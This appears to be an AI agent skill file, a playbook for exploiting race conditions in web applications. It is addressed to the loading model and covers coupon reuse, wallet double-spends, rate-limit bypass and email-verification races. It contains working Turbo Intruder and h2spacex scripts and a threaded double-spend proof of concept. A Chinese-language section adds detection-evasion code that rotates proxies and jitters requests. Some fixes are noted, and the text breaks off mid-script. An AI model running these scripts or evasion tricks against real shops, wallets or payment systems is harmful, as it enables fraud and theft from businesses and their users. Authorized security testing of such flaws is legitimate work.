---
name: race-condition
description: >-
  Race condition and TOCTOU testing for web apps. Use when testing one-time operations, concurrent HTTP abuse, rate-limit bypass, Turbo Intruder gates, HTTP/2 single-packet attacks, and CWE-362-style synchronization gaps.
---

# SKILL: Race Conditions — Testing & Exploitation Playbook

> **AI LOAD INSTRUCTION**: Treat race conditions as **authorization/state integrity** issues: non-atomic read-then-write lets multiple requests observe stale state. Prioritize **one-time** or **balance-like** operations. Combine **parallel transport** (HTTP/1.1 last-byte sync, HTTP/2 single-packet, Turbo Intruder gates) with **application evidence** (duplicate success responses, inconsistent balances, duplicate ledger rows). **Authorized testing only.** Routing note: for business workflows, coupons, inventory, or one-time rewards, start with this skill and cross-load `business-logic-vulnerabilities`.

---

## 0. QUICK START — What to Test First

Target endpoints where **check** and **update** are unlikely to be a single atomic database operation:

| Priority | Operation class | Example paths / parameters |
|----------|------------------|----------------------------|
| 1 | One-time redeem / coupon / bonus | `redeem`, `apply_coupon`, `claim_reward`, `voucher` |
| 2 | Balance / quota / stock deduction | `transfer`, `purchase`, `reserve`, `inventory` |
| 3 | Invite / referral / signup bonus | `invite_accept`, `referral_claim` |
| 4 | Password / email / MFA verification | `verify_token`, `confirm_email`, `reset_password` |
| 5 | Idempotent-looking APIs without strong keys | `POST` that should succeed only once per user |

**First moves (conceptual)**:

1. Capture the **state-changing** request in a proxy.
2. Send **20–100** copies **as simultaneously as your tooling allows**.
3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent final state**.

---

## 1. CORE CONCEPT

### 1.1 TOCTOU (Time-of-check to time-of-use)

```
Thread A                    Thread B
   |                            |
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see "OK"
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE           ← duplicate effect
```

**TOCTOU** means the **decision** (check) and the **mutation** (use) are not one indivisible step.

### 1.2 Non-atomic read-then-write

Typical vulnerable pseudo-flow:

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

Two concurrent requests can both pass the `if` before either `UPDATE` commits.

### 1.3 Database-level vs application-level locking gaps

| Layer | What goes wrong |
|-------|------------------|
| **Application** | In-memory flag, cache, or session says "not used yet" while DB already updated — or the reverse. |
| **ORM / service** | Two instances, no distributed lock; each thinks it owns the decision. |
| **DB** | Missing `SELECT … FOR UPDATE`, wrong isolation level, or logic split across multiple statements without transaction. |
| **API gateway** | Per-IP rate limit is **check-then-increment** — parallel burst passes duplicate checks. |

**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes — test whether the app **enforces** them on the hot path.

---

## 2. ATTACK PATTERNS

### 2.1 Limit-overrun (double redeem / double claim)

Send the **same** authenticated request many times in parallel:

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**Success signal**: HTTP `200`/`201` more than once, duplicate ledger entries, or balance higher than policy allows.

### 2.2 Rate-limit bypass via simultaneity

If limits are implemented as **counters checked per request** without atomic increment:

```http
POST /api/v1/login HTTP/1.1
Host: target.example
Content-Type: application/json

{"email":"victim@example.com","password":"wrong"}
```

Fire **N** parallel attempts in one wave; compare with **N** sequential attempts.

**Success signal**: more failures accepted than documented cap, or lockout never triggers when burst completes inside one window.

### 2.3 Multi-step exploitation (beat the pipeline)

Workflow: `create → pay → confirm`. If **confirm** does not cryptographically bind to **pay** completion:

1. Start two parallel pipelines from the same session/item.
2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or abandoned.

**Success signal**: item marked paid/shipped without matching payment, or state skips backward.

---

## 3. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

**Idea**: Hold all requests **blocked** until every socket has sent the full request **except the last byte** of the body; then release the final byte together so the server receives them in a tight cluster.

```text
Client 1: [headers + body - 1 byte] ----hold----+
Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together
Client N: [headers + body - 1 byte] ----hold----+
```

**Why**: Reduces **network jitter** between copies compared to naive sequential paste in Repeater.

**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern (see §5) as the practical stand-in for synchronized release.

---

## 4. HTTP/2 SINGLE-PACKET ATTACK

**Idea**: Multiplex several complete HTTP/2 streams and **coalesce** their frames so the first bytes of all requests exit the NIC in **one** TCP segment (or minimally separated). Receiver-side scheduling then processes them with **sub-millisecond** spacing.

**Burp Repeater (modern workflows)**:

1. Open multiple tabs or select multiple requests.
2. Use **Send group (parallel)** / **single-packet attack** where available.
3. Prefer HTTP/2 to the target if supported.

```text
  [ Req A stream ]
  [ Req B stream ]  --HTTP/2-->  one burst -->  app worker pool
  [ Req C stream ]
```

**Why it often beats HTTP/1.1 last-byte tricks**: tighter alignment on the wire; less dependence on per-connection serialization.

---

## 5. TURBO INTRUDER TEMPLATES

Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) (Burp Suite extension).

### 5.1 Template 1 — Same endpoint, gate release

**Settings**: `concurrentConnections=30`, `requestsPerConnection=30`, use a **gate** so all threads fire together.

**Core pattern** (repeat N times, then release):

```python
for _ in range(N):
    engine.queue(request, gate='race1')
engine.openGate('race1')
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Header requirement** (unique per queued copy for log correlation; Turbo Intruder payload placeholder):

```http
x-request: %s
```

Turbo Intruder replaces `%s` per request when paired with a wordlist (or other payload source) — keep this header on the **base request** in Repeater before sending to Turbo Intruder. Case-insensitive for HTTP; use a consistent name for log grep.

### 5.2 Template 2 — Multi-endpoint, same gate

**Pattern**: One **POST** to **target-1** (state change) plus **many GETs** to **target-2** (read side) released together to widen the TOCTOU window observation.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')

    engine.openGate('race1')
```

Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines — consult upstream docs for your Burp version).

---

## 6. CVE REFERENCE — CVE-2022-4037

**CVE-2022-4037** (GitLab CE/EE): race condition leading to **verified email address forgery** and risk when the product acts as an **OAuth identity provider** — third-party account linkage/impact scenarios. **CWE-362**. Demonstrated in public research with **HTTP/2 single-packet** style timing to win narrow windows.

**Takeaway for testers**: email verification, OAuth linking, and "confirm ownership" flows are high-value race targets — not only coupons and balances.

**References (official / neutral)**:

- [NVD — CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)
- GitLab security advisories and vendor CVE JSON for affected version ranges

---

## 7. TOOLS

| Tool | Role |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | High-concurrency replay, **gates**, scripting in Burp. |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | Race-focused HTTP client patterns (verify compatibility with your stack). |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 low-level / single-packet style experimentation (use responsibly, authorized targets only). |
| **Burp Suite — Repeater** | **Send group (parallel)** / **single-packet attack** for multi-request synchronization. |

---

## 8. DECISION TREE

```text
                         START: state-changing API?
                                    |
                     NO -----------+---------- YES
                      |                        |
                   stop here              one-time / balance / verify?
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    coupon-like                 rate limit                  multi-step
                          |                         |                         |
                   parallel same req          parallel vs serial         parallel pipelines
                          |                         |                         |
                   duplicate success?           limit exceeded?          state mismatch?
                     /       \                    /       \                  /       \
                   YES       NO                 YES       NO               YES       NO
                    |         |                  |         |                |         |
              report +    try HTTP/2        report +    try TI        report +   deepen
              evidence    single-packet      evidence    gates                     per-step
                    |         |                  |         |                |         |
                    +----+----+                  +----+----+                +----+----+
                         |                            |                          |
                    tool pick                    tool pick                  tool pick
                         v                            v                          v
              Burp group / h2spacex            TI gates / Raceocat          TI + trace IDs
```

**How to confirm (evidence checklist)**:

1. **Reproducible** duplicate success under parallelism, not flaky single retries.
2. **Server-side** artifact: two rows, two emails, two grants, or wrong final balance.
3. **Correlate** with `x-request` (or similar) markers or unique body fields in logs (authorized environments).

**Routing summary**: if the scenario is more about business rules, pricing, or workflow bypass, load `skills/business-logic-vulnerabilities/SKILL.md`; this file focuses on **concurrency and transport-layer synchronization**.

---

## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS

### 9.1 TCP Nagle Algorithm & Frame Coalescing

TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).

```text
Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
                            ↓ TCP Nagle coalescing ↓
TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet on the wire
```

- `TCP_NODELAY` **disabled** (default) → Nagle active → coalescing happens naturally
- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames
- Practical limit: ~20–30 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization

### 9.2 Server-Side Request Queue Processing

```text
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
  └─ Stream 5 → worker thread C ─┘
```

1. Single `recv()` syscall returns the entire segment
2. HTTP/2 frame parser demultiplexes streams from same segment
3. Dispatcher fans out to application worker pool

First-to-last request dispatch gap: **< 100 μs** on modern servers — orders of magnitude tighter than HTTP/1.1 last-byte sync (~1–5 ms network jitter).

### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison

| Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
|--------|---------------------|-------------------|
| Connections needed | 1 | N (one per request) |
| Wire synchronization | Same TCP segment | N segments released "simultaneously" |
| Network jitter impact | Zero (same packet) | Each connection has independent RTT |
| Server dispatch gap | < 100 μs | 1–5 ms typical |
| Practical limit | ~20–30 requests per MTU | Limited by connection setup |

### 9.4 Practical Execution with h2spacex

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon Exploited | Attack Window | Typical Vulnerable Pattern |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads Thread A's uncommitted write | `SELECT balance` sees in-flight deduction, proceeds with stale logic |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check, both deduct | `SELECT` → app check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot isolation hides concurrent inserts; both threads see "0 claims" and insert | `INSERT IF NOT EXISTS` pattern without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Application uses `pg_advisory_lock()` / `GET_LOCK()` with wrong scope or derivable key | Lock key from user input; session-vs-transaction scope mismatch |

### READ COMMITTED TOCTOU (most common in production)

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- returns 0 (snapshot)                -- returns 0 (snapshot)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- succeeds                    COMMIT; -- succeeds ← duplicate claim
```

**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level.

### SERIALIZABLE Advisory Lock Bypass

```sql
-- Application intends: one lock per coupon
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- Bypass vectors:
--   1. Lock is session-scoped but transaction rolls back → lock persists, next txn skips
--   2. Different code path reaches claim logic without acquiring the lock
--   3. Attacker triggers claim via alternative API endpoint that lacks locking
```

### Quick Audit Checklist

```text
□ SHOW TRANSACTION ISOLATION LEVEL — what level is the database running?
□ Does the hot path use SELECT ... FOR UPDATE or explicit row locks?
□ Is the check-then-act sequence inside a single transaction?
□ Are UNIQUE constraints enforced on the critical state table?
□ Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?
```

---

## 11. LIMIT-OVERRUN ATTACK PATTERNS

### 11.1 Coupon / Promo Code Reuse

```text
Target:   POST /api/apply-coupon {"code":"SUMMER50"}
Expected: One use per user
Attack:   20 parallel identical requests
Evidence: Multiple 200 responses, final order total = N × discount applied
```

Variations: same coupon across different cart items; apply-coupon + checkout in parallel (coupon consumed only at checkout).

### 11.2 Vote / Rating Manipulation

```text
Target:   POST /api/vote {"post_id":123,"direction":"up"}
Expected: One vote per user per post
Attack:   50 parallel vote requests
Evidence: Vote count += N, or DB shows multiple vote rows for same user+post
```

### 11.3 Balance Double-Spend

```text
Target:   POST /api/transfer {"to":"attacker","amount":100}
Balance:  Exactly 100
Attack:   2+ parallel transfers
Evidence: Both succeed, sender balance goes negative, recipient receives 200
```

Higher-value variant: withdrawal to external system (crypto, bank wire) where reversal is difficult.

### 11.4 Inventory Oversell

```text
Target:   POST /api/purchase {"item_id":"limited_edition","qty":1}
Stock:    1 remaining
Attack:   20 parallel purchase requests
Evidence: Multiple orders created, stock counter goes negative
```

Compound attack: add-to-cart and checkout are separate steps, each checking inventory independently.

### 11.5 Referral / Signup Bonus

```text
Target:   POST /api/referral/claim {"code":"REF_ABC"}
Expected: One claim per referred user
Attack:   Parallel claims from same session
Evidence: Bonus credited to referrer multiple times
```

---

## 12. SINGLE-PACKET MULTI-ENDPOINT ATTACK

Instead of N copies of the same request, send requests to **different endpoints** in one HTTP/2 single-packet burst. This widens the TOCTOU window by hitting both the check and use paths simultaneously.

### Pattern 1: State-check + State-mutate

```text
Single TCP segment:
  Stream 1: GET  /api/balance       ← probe pre-state
  Stream 3: POST /api/transfer      ← mutate
  Stream 5: POST /api/transfer      ← mutate (duplicate)
  Stream 7: GET  /api/balance       ← probe post-state
```

Balance inconsistency between stream 1 and stream 7 confirms the race window was hit.

### Pattern 2: Cross-resource race

```text
Single TCP segment:
  Stream 1: POST /api/coupon/apply   ← apply discount
  Stream 3: POST /api/order/checkout ← finalize order
```

If coupon application and checkout check prices independently, the discount may apply after checkout has locked the price.

### Pattern 3: Auth verification + Privileged action

```text
Single TCP segment:
  Stream 1: POST /api/email/verify?token=TOKEN  ← verify email
  Stream 3: POST /api/account/upgrade            ← requires verified email
```

Upgrade may succeed during the brief window where verification is processing but not yet committed.

### Practical setup

Burp Repeater: add requests targeting **different paths** to the same group → "Send group (single packet)".

```python
headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]

all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']

h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
```

---

## 13. 2026 EMERGING TECHNIQUES

### 13.1 Payment / Wallet System Races (2026 Field Cases)

Wallet and stored-value systems remain a high-severity blind spot because developers rarely load-test the check-then-debit path under true concurrency.

**WooCommerce wallet-payment race**: a malicious bot fires 5 wallet-funded orders (totaling ~$11.50) against a wallet holding ~$2.x. Because the plugin lacks `GET_LOCK()` or `SELECT ... FOR UPDATE`, all five requests land in the same millisecond, each reading the same initial balance, each passing the `balance >= total` check before any debit commits. Root cause: the **check** (is balance sufficient?) and the **use** (debit the wallet) are non-atomic — a textbook TOCTOU.

```python
# PoC - 5 concurrent wallet-funded checkouts against a $2.x balance
import threading, requests

URL = "https://shop.example/?wc-api=wc_wallet_gateway"
orders = [101, 102, 103, 104, 105]   # pre-created order IDs, ~$2.30 each

def pay(order_id):
    requests.post(URL, data={
        "order_id": order_id,
        "wallet_action": "pay",
        "_wpnonce": NONCE,
    }, cookies=COOKIES)

threads = [threading.Thread(target=pay, args=(o,)) for o in orders]
for t in threads: t.start()
for t in threads: t.join()
# Expected: 1 success, 4 "insufficient balance"
# Observed (vulnerable): 5 successes, wallet balance goes negative,
#   and 5 orders are marked paid against ~$2.x
```

The fix is a single atomic debit: `UPDATE wallets SET balance = balance - ? WHERE id = ? AND balance >= ?` and check `affected_rows == 1` — no separate read.

### 13.2 Gift Card / Voucher Duplicate Redemption (2026)

Redeeming the same $10 voucher concurrently 10 times exploits the gap between "verify voucher valid" and "mark voucher used":

```text
Thread A: SELECT status FROM vouchers WHERE code='X'  -> 'valid'
Thread B: SELECT status FROM vouchers WHERE code='X'  -> 'valid'   <- not yet marked
... (10 threads all see 'valid')
Thread A..J: UPDATE vouchers SET status='used' WHERE code='X'
Thread A..J: credit $10 to balance
# Result: $100 credited for a single $10 voucher
```

This pattern recurs in loyalty-point top-ups, promo-code stacking, and one-time refund credits. Developers almost never test the redemption path under concurrency, making it a persistent high-severity gap in payment, wallet, and recharge systems.

### 13.3 AI Agent Concurrent Races (2026 New Surface)

LLM agents that process concurrent sessions for the same user introduce novel TOCTOU windows because the tool-calling layer has no locking:

```text
- Same user runs two agent sessions; both call grant_role(user, 'admin')
  in parallel - if the authz check and grant are not atomic, the second
  re-checks "is user already admin?" before the first commits -> double
  grant or privilege-escalation bypass.
- Agent rate-limit counters: N concurrent requests all read counter=0
  before any increments -> all pass the limit check.
- Inventory/credit: two sessions reserve the last item simultaneously.
```

Agent frameworks (LangGraph, CrewAI, AutoGen) do not serialize tool calls per resource — the model fires tool invocations and the runtime dispatches them concurrently. Any shared mutable state (balance, quota, role) is a race target (cross-link ../ai-llm-attack-surface/SKILL.md).

### 13.4 HTTP/2 Concurrent-Stream Races (2026)

HTTP/2 multiplexing lets a single connection carry many concurrent streams — far more reliable than HTTP/1.1 pipelining for hitting a server-side race window:

```python
# HTTP/2 concurrent-stream race against a balance endpoint
import h2spacex

conn = h2spacex.H2OnTCPSocket('shop.example.com', 443)
conn.setup_connection()

headers = [(':method','POST'), (':path','/api/wallet/pay'),
           (':authority','shop.example.com'), (':scheme','https'),
           ('content-type','application/json'),
           ('authorization','Bearer TOKEN')]
# send 20 concurrent streams in one TCP segment (single-packet)
conn.send_multiple_requests_at_once(
    [headers]*20,
    body_list=[b'{"order_id":9991,"amount":2.30}']*20
)
# All 20 hit the check-then-debit within <100us - TOCTOU window exploited
```

Because all streams share one TCP connection, there is no per-connection jitter. The server dispatches them to a worker pool with sub-millisecond spacing, landing squarely inside most non-atomic check/use windows.

### 13.5 Database Lock Bypass Evolution (2026)

| Lock type | 2026 bypass vector | Window |
|---|---|---|
| Optimistic (version field) | TOCTOU between read-version and write-version; concurrent reads see same version, both write, second overwrites first (lost update) | check `version` -> mutate -> `UPDATE ... WHERE version=?` |
| Pessimistic (`FOR UPDATE`) | `READ COMMITTED` does not block phantom rows; `FOR UPDATE` locks existing rows but a concurrent INSERT of a "new" claim row still succeeds | snapshot isolation hides sibling inserts |
| Redis `WATCH/MULTI` | cluster mode routes keys to different slots; a multi-key transaction spanning slots is rejected or non-atomic, defeating optimistic CAS | `WATCH` invalidated only if same-slot key changes |

**Optimistic-lock TOCTOU**:

```text
Thread A: SELECT id, balance, version FROM accounts WHERE id=1  -> version=7
Thread B: SELECT id, balance, version FROM accounts WHERE id=1  -> version=7
Thread A: UPDATE accounts SET balance=balance-100, version=8 WHERE id=1 AND version=7  -> OK
Thread B: UPDATE accounts SET balance=balance-100, version=8 WHERE id=1 AND version=7  -> OK
# Both see version=7; both succeed -> double-spend despite "optimistic locking"
# (only safe if the second UPDATE returns 0 affected rows AND the app retries/aborts)
```

### 13.6 2026 Race Checklist

```
□ Wallet/stored-value: is the debit a single atomic UPDATE with balance>=? guard?
□ Voucher/redemption: UNIQUE(code, user) constraint or SELECT...FOR UPDATE on the voucher row?
□ If optimistic locking: does the app check affected_rows==0 and abort (not ignore)?
□ HTTP/2 enabled: test single-packet concurrent streams on balance/coupon endpoints
□ AI agents: are concurrent tool calls (grant_role, debit) serialized per resource?
□ Rate-limit counters: atomic increment (Redis INCR) or check-then-increment (race)?
□ Redis cluster: do critical transactions span multiple hash slots?
□ Reproduce with x-request markers and confirm server-side duplicate ledger rows
```

---

## Related

- **business-logic-vulnerabilities** — workflow, coupon abuse, and logic-first checklists (`../business-logic-vulnerabilities/SKILL.md`).

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 4 条完整实战攻击链，涵盖优惠券竞态、余额双花、邮件验证绕过、AI API 限流绕过。所有脚本均可在授权测试环境中直接运行。

### 攻击链 1：优惠券/折扣并发重放（Turbo Intruder）

**场景**：电商平台优惠券 `SAVE100` 限制每用户仅可使用一次，后端采用「先查后改」非原子操作。利用 Turbo Intruder 的 gate 机制实现并发请求，在数据库写入"已使用"标记前多次通过校验。

**漏洞根因分析**：
```python
# 后端脆弱代码示例（Python Flask + SQLAlchemy）
@app.route('/api/apply_coupon', methods=['POST'])
def apply_coupon():
    coupon = Coupon.query.filter_by(code=request.json['code']).first()
    # 致命缺陷：SELECT 查询与 UPDATE 不在同一原子事务中
    used = CouponUsage.query.filter_by(
        user_id=current_user.id, coupon_id=coupon.id
    ).first()
    if used:
        return jsonify({"error": "已使用过此优惠券"}), 400
    # === TOCTOU 窗口：20个并发请求全部到达此处 ===
    # 所有请求都查到 used=None，全部通过校验
    db.session.add(CouponUsage(user_id=current_user.id, coupon_id=coupon.id))
    db.session.commit()
    # 折扣被重复应用 N 次
    return jsonify({"discount": coupon.discount_amount})
```

**Turbo Intruder 完整利用脚本**：
```python
# Turbo Intruder 脚本 - 优惠券并发重放
# 在 Burp Suite 中：右键请求 -> Send to Turbo Intruder -> 粘贴此脚本
def queueRequests(target, wordlists):
    # 创建并发引擎：30个连接，每连接30请求，使用 gate 同步释放
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,      # 30个并发连接
        requestsPerConnection=30,     # 每连接发送30个请求
        pipeline=False,               # 关闭管道（HTTP/1.1 keep-alive 即可）
        engine=Engine.THREADED,
        maxRetriesPerRequest=0         # 失败不重试，保持时序
    )

    # 将30个相同请求排入 gate，但暂不发送
    # gate 会阻塞所有请求，直到 openGate 被调用
    for i in range(30):
        # target.req 是从 Burp 捕获的原始请求模板
        # %s 会被替换为唯一标识，便于日志关联
        engine.queue(target.req, gate='race1')

    # 同时释放所有请求 - 实现"单包攻击"效果
    # 所有30个请求在同一毫秒内到达服务器
    engine.openGate('race1')

def handleResponse(req, interesting):
    # 记录每个响应，重点观察状态码和响应体
    table.add(req)
    # 成功标志：多个 200 响应（而非1个200 + 29个400）
```

**原始请求模板（Burp 捕获后发送到 Turbo Intruder）**：
```http
POST /api/apply_coupon HTTP/1.1
Host: shop.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json
Cookie: session=abc123def456
x-request: %s

{"code":"SAVE100","order_id":"ORD-20260724-001"}
```

**结果验证与证据收集**：
```bash
# 1. 攻击前记录订单总额
curl -s https://shop.target.com/api/orders/ORD-20260724-001 \
  -H "Authorization: Bearer $TOKEN" | jq '.total'
# 输出: 500.00

# 2. 执行 Turbo Intruder 并发攻击后再次查询
curl -s https://shop.target.com/api/orders/ORD-20260724-001 \
  -H "Authorization: Bearer $TOKEN" | jq '.total, .discounts_applied'
# 漏洞证据输出:
# 200.00          <- 总额从500降到200（应用了3次100元折扣）
# [
#   {"code":"SAVE100","amount":100},
#   {"code":"SAVE100","amount":100},
#   {"code":"SAVE100","amount":100}  <- 同一优惠券被应用3次
# ]

# 3. 数据库层面验证（授权环境）
# SELECT COUNT(*) FROM coupon_usage WHERE user_id=42 AND coupon_id=15;
# 预期: 1  |  实际(漏洞): 3
```

**检测绕过技术**：
```python
# 绕过1：分散请求源IP（对抗基于IP的并发检测）
# 使用多个代理出口，每个连接走不同IP
import requests
from concurrent.futures import ThreadPoolExecutor

PROXIES = [
    {"https": "socks5://proxy1:1080"},
    {"https": "socks5://proxy2:1080"},
    {"https": "socks5://proxy3:1080"},
]

def apply_coupon(proxy_idx):
    requests.post(
        "https://shop.target.com/api/apply_coupon",
        json={"code": "SAVE100", "order_id": "ORD-001"},
        headers={"Authorization": f"Bearer {TOKEN}"},
        proxies=PROXIES[proxy_idx % len(PROXIES)],
        timeout=5
    )

# 30个请求分散到3个代理IP，每个IP仅10个请求
with ThreadPoolExecutor(max_workers=30) as pool:
    pool.map(apply_coupon, range(30))

# 绕过2：添加随机延迟抖动（对抗固定窗口检测）
import random, time
def apply_coupon_jitter():
    time.sleep(random.uniform(0, 0.05))  # 0-50ms随机抖动
    # 但抖动需控制在TOCTOU窗口内（通常<100ms）
    requests.post("https://shop.target.com/api/apply_coupon", ...)
```

---

### 攻击链 2：余额转账双花（HTTP/2 单包攻击）

**场景**：钱包余额恰好为 100 元，通过并发转账请求实现双花——多个转账请求在同一时间窗口内通过余额校验，导致余额变为负数，攻击者实际收到多倍金额。

**漏洞根因**：
```sql
-- 后端脆弱的转账逻辑（MySQL InnoDB，READ COMMITTED 隔离级别）
START TRANSACTION;
-- 步骤1：查询余额（非锁定读）
SELECT balance FROM wallets WHERE user_id = 42;  -- 返回 100.00
-- 步骤2：应用层校验
-- if balance >= 100: pass  （此时其他并发事务也查到 100）
-- 步骤3：扣减余额
UPDATE wallets SET balance = balance - 100 WHERE user_id = 42;
-- 步骤4：增加收款方余额
UPDATE wallets SET balance = balance + 100 WHERE user_id = 999;
COMMIT;
-- 问题：步骤1的 SELECT 没有 FOR UPDATE，不阻塞并发读取
```

**Python 并发双花 PoC 脚本**：
```python
#!/usr/bin/env python3
"""
余额转账双花 PoC - 并发请求利用 TOCTOU 窗口
使用 barrier 同步实现精准并发
"""
import threading
import requests
import time
import json

# ===== 配置 =====
TARGET = "https://wallet.target.com/api/transfer"
TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
SENDER_SESSION = "session=attacker_session_id"
RECEIVER_ACCOUNT = "ACC_ATTACKER_002"
TRANSFER_AMOUNT = 100.00
CONCURRENT_REQUESTS = 20  # 并发请求数

# ===== 同步屏障 =====
barrier = threading.Barrier(CONCURRENT_REQUESTS)
results = []

def transfer_money():
    """单个转账请求，所有线程在 barrier 处同步等待后同时发送"""
    headers = {
        "Authorization": TOKEN,
        "Content-Type": "application/json",
        "Cookie": SENDER_SESSION,
    }
    payload = {
        "to_account": RECEIVER_ACCOUNT,
        "amount": TRANSFER_AMOUNT,
        "currency": "CNY",
    }

    # 所有线程到达 barrier 后同时释放 - 模拟单包攻击
    barrier.wait()

    try:
        resp = requests.post(TARGET, json=payload, headers=headers, timeout=10)
        results.append({
            "status": resp.status_code,
            "body": resp.json() if resp.headers.get('content-type','').startswith('application/json') else resp.text,
            "time": time.time()
        })
    except Exception as e:
        results.append({"status": -1, "body": str(e), "time": time.time()})

# ===== 执行攻击 =====
print(f"[*] 发起 {CONCURRENT_REQUESTS} 个并发转账请求...")
threads = [threading.Thread(target=transfer_money) for _ in range(CONCURRENT_REQUESTS)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# ===== 分析结果 =====
success_count = sum(1 for r in results if r["status"] == 200)
fail_count = sum(1 for r in results if r["status"] != 200)
print(f"\n[+] 攻击完成:")
print(f"    成功转账次数: {success_count}")  # 漏洞: 远大于1
print(f"    失败次数: {fail_count}")
print(f"    预期成功: 1 (余额100，转账100)")
print(f"    实际成功: {success_count} (双花 {success_count - 1} 次)")
print(f"    获利: {(success_count - 1) * TRANSFER_AMOUNT} CNY")

# 时间分析：所有成功请求的时间戳差应 < 100ms
success_times = [r["time"] for r in results if r["status"] == 200]
if len(success_times) > 1:
    window = max(success_times) - min(success_times)
    print(f"    TOCTOU 窗口: {window*1000:.2f} ms")
```

**HTTP/2 单包攻击增强版**（更精准的时序控制）：
```python
#!/usr/bin/env python3
"""
HTTP/2 单包攻击 - 余额双花
利用 HTTP/2 多路复用，所有请求在单个 TCP 段内到达服务器
需要: pip install h2spacex
"""
import h2spacex

# 建立到目标的 HTTP/2 连接
conn = h2spacex.H2OnTCPSocket(
    hostname='wallet.target.com',
    port_number=443
)
conn.setup_connection()

# 构造20个相同的转账请求头
headers_template = [
    (':method', 'POST'),
    (':path', '/api/transfer'),
